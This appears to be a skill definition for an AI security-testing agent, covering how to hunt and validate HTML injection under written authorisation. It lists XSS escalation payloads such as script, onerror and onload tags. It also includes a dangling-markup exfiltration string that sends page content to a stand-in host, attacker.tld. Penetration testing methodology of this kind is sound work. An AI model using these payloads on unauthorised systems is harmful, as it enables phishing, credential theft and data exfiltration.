---
name: html-injection
description: "Canonical html-injection capability consolidating 1 sub-skill: hunt-html-injection. Use when hunting or validating HTML injection vulnerabilities."
sources: consolidated
---

# HTML-INJECTION — Canonical Capability

## 1. Identity and purpose

This is the single primary capability entry point for the `html-injection` security domain. It consolidates 1 previously separate sub-skill — `hunt-html-injection` — into one operational entry point while preserving all source content in `references/` and the original sub-skill directory for rollback.

Primary objectives:
- Identify inputs that are reflected or stored and rendered as raw HTML without sanitisation.
- Prove unambiguously that injected tags survive encoding (literal `<` angle brackets in the response).
- Distinguish HTML injection from XSS and escalate when script execution is possible.
- Cover advanced vectors: dangling-markup exfiltration and email/notification-context injection.

## 2. Scope

In scope:
- Any input reflected or stored and displayed in an HTML context: search boxes, comments, feedback, reviews, profile fields, error messages, contact-form subject/body, admin-visible fields.
- Non-script tag injection (`<b>`, `<h1>`, `<a>`, `<img>`, `<form>`, `<meta http-equiv="refresh">`).
- Dangling-markup exfiltration where `<script>`/event handlers are filtered but raw `<` is reflected.
- Email/notification-context injection into transactional emails.

Out of scope (hand off):
- Markup that executes JavaScript -> `hunt-xss` / XSS capability.
- Pure reflection with full encoding -> no finding.
- Non-HTML contexts (JSON, plain text) -> not HTML injection targets.

## 3. Invocation and routing

Use this capability when:
- Testing text-display surfaces for unescaped HTML reflection or storage.
- A unique canary tag survives encoding in the response.
- Assessing phishing/UI-defacement/credential-harvesting impact via injected markup.

Routing notes:
- Start with `references/hunt-html-injection.md` for hypothesis, attack surface, autonomous testing priority, proof requirements, and distinguishing from XSS.
- Escalate to XSS capability when `<script>` or event handlers execute.
- Hand off dangling-markup exfiltration chains to the relevant data-exfil/XSS references as needed.

## 4. Inputs and outputs

Inputs:
- Target URLs and input parameters (query, body, headers) reflected or stored.
- Test account sessions for stored-injection verification.
- Canary string unique to the test run.

Outputs:
- Confirmed or refuted HTML injection findings with raw response evidence.
- Escalation notes to XSS when script execution is demonstrated.
- Impact assessment (phishing, defacement, credential harvesting, exfiltration).
- False-positive rulings with encoding rationale.

## 5. Preconditions and authorization

- Confirm written authorization and scope before testing.
- Use only test accounts and non-production data unless explicitly authorized.
- Do not harvest real credentials; PoCs use canary data only.
- Respect scope: only test authorized applications.
- Document any out-of-scope or protected field and hand off rather than claim.

## 6. Reconnaissance

Recon steps:
1. Enumerate text-display surfaces: search (`?q=`), comments, feedback, reviews, profile fields, error messages (`?error=`, `?message=`), contact-form subject/body, admin-visible ticket titles/usernames.
2. Identify reflection vs storage: does input appear in the same response or a later page/email?
3. Determine the HTML context: body text, attribute, tag name, script, style, URL.
4. Check for existing encoding/filtering (WAF, sanitiser) by sending benign `<b>`.

See `references/hunt-html-injection.md` (Attack Surface, Autonomous Testing Priority).

## 7. Detection methodology

Core detection flow:
1. Inject a recognisable HTML tag with a unique canary: `<b>CANARY</b>` and `\"><b>CANARY</b>`.
2. Inspect the response for literal `<b>CANARY` (unescaped). If `&lt;b&gt;` appears, the app encodes — no finding.
3. Try multiple tag types when `<b>` is filtered: `<h1>`, `<img src=x onerror=CANARY>`, `<a href="https://attacker.com">`.
4. For stored injection: inject into the storage endpoint, then GET the display page and check for unescaped tags.
5. Escalate immediately: if `<b>` injection works, try `<script>alert(1)</script>` — same unsanitised input may allow full XSS.
6. Test dangling-markup exfiltration and email-context injection where applicable.

Canary in response with literal angle brackets = confirmed injection. `alert(1)` alone is NOT proof.

## 8. Technique selection

Select techniques by observed filtering:
- No filtering -> basic tag injection then XSS escalation.
- `<script>` filtered but `<b>`/`<img>` pass -> HTML injection finding; attempt `<img onerror>` for XSS escalation.
- Attribute context -> break out with `"`, then inject tag.
- Stored context -> verify on the rendering page/email.
- Filtered event handlers but raw `<` reflected -> dangling-markup exfiltration.
- Email/notification context -> inject into name/subject/comment and read raw email source.

See `references/hunt-html-injection.md`.

## 9. Execution steps

1. Establish baseline: send benign `<b>CANARY</b>` to each surface; record encoding behaviour.
2. Screen candidates where literal `<b>CANARY` appears unescaped.
3. Confirm with a unique 4+ digit canary number (not `alert(1)`).
4. Test stored injection by injecting then rendering on the display page.
5. Escalate to `<script>alert(CANARY)</script>` and event handlers; document if XSS is also possible.
6. Test dangling-markup exfiltration with an unterminated `<img src='//attacker.tld/log?html=`.
7. Test email/notification context by injecting and reading raw email source.
8. Document all vulnerable and protected surfaces.

## 10. Tool usage

- Proxy: Burp Suite (intercept/modify requests, inspect responses).
- Browser: modern browser with DevTools (rendered vs source view).
- HTTP client: curl / Python requests for automated multi-endpoint checks.
- Email client/raw source viewer for notification-context testing.
- Local server for dangling-markup exfiltration capture.

See `references/hunt-html-injection.md`.

## 11. Payloads and test cases

Representative test cases (adapt to target):
- Basic: `<b>CANARY</b>` and `\"><b>CANARY</b>`.
- Tag variety: `<h1>CANARY</h1>`, `<img src=x onerror=CANARY>`, `<a href="https://attacker.com">click</a>`.
- Escalation: `<script>alert(91234)</script>`, `<svg onload=alert(91234)>`.
- Dangling markup: `<img src='//attacker.tld/log?html=` (no closing quote/`>`).
- Email context: inject `<a href="https://attacker.com">` into name/subject/comment.
- Proof check: response contains literal `<` angle brackets, not `&lt;`.

## 12. Evidence

Each finding must include:
- Exact request (URL, parameter, payload) and response snippet showing literal `<`.
- Canary string unique to the test run.
- Whether reflection is immediate or stored (with display URL).
- Escalation result (XSS possible or not).
- Impact assessment tied to a concrete scenario (phishing form, defacement, credential harvesting, exfiltration).
- For refuted candidates: encoding evidence (`&lt;`).

## 13. Reproduction and validation

- Reproduce with a clean request and the same payload; confirm literal `<` in response.
- Validate rendering in a real browser (view source vs rendered).
- Confirm the canary is distinctive (4+ digit number) and not from page hint text.
- Re-test after any WAF/sanitiser change.
- Mark as refuted if only encoded output is observed.

## 14. False-positive rejection

Reject or downgrade when:
- The app HTML-encodes `<` to `&lt;` (no injection).
- Only `alert(1)` appears in page hint/example text (not your reflection).
- The context is non-HTML (JSON, plain text) with no rendering.
- Script execution is not achieved and impact is purely cosmetic with no sensitive surface (informational).
- Stored value is sanitised on render even if stored raw.

## 15. Impact

Impact guidance:
- High: credential harvesting via injected login form, account-takeover stepping stone, exfiltration of CSRF tokens/PII via dangling markup, email-context injection reaching inbox.
- Medium: phishing via injected `<a>`/`<form>`, UI defacement on sensitive pages.
- Low/Informational: cosmetic tag injection on non-sensitive public pages with no escalation path.

Always tie impact to a concrete scenario; avoid severity inflation from tag reflection alone.

## 16. Reporting

Report template:
- Summary: URL, parameter, vulnerability type (HTML injection), impact.
- Evidence: request/response snippet with literal `<`, canary.
- Context: reflected/stored, immediate/email.
- Escalation: XSS possible or not (with payload result).
- Impact scenario and affected users.
- Remediation: context-aware output encoding (HTML entity encoding), input validation, CSP, sanitiser (DOMPurify) for rich text, email template escaping.

See `references/hunt-html-injection.md`.

## 17. Failure modes

- App encodes output -> no finding; document encoding.
- WAF blocks `<` but allows encoded variants -> try alternatives; document.
- Stored injection not rendered on any accessible page -> cannot confirm; note.
- Email rendering differs from web -> test raw email source; document.
- Dangling-markup exfiltration requires a following quote/secret -> if none, refute.

## 18. References

All 1 sub-skill reference is preserved and must resolve:

| Reference | Sub-capability | Load when |
|---|---|---|
| `references/hunt-html-injection.md` | `hunt-html-injection` | Hypothesis, attack surface, testing priority, proof, XSS distinction |

Original sub-skill remains intact under `hunt-html-injection/`.

## 19. Testing and mastery

- Validate with the capability tests in `tests/test_html_injection_capability.py`.
- Confirm all referenced files resolve and are non-empty.
- Confirm migration map paths/hashes/status are accurate.
- Practice on authorized labs: deliberately vulnerable HTML injection labs, OWASP WebGoat.
- Mastery criteria: independently discover, validate (literal unescaped tag with unique canary), and report an HTML injection finding with full reproduction and impact, correctly refuting encoded-only candidates and escalating to XSS where possible.

---

Original sub-skill remains intact for reversibility. See `migration_map.json`.


## Knowledge sources

- WKS bug classes: none mapped
- Domain knowledge: none mapped
- WKS remains the structured source of truth; retrieve and validate items through WKS rather than duplicating the full corpus in this skill.
- Research and learning material is mapped in `stage-a/knowledge-source-map.json` and must be validated before promotion.
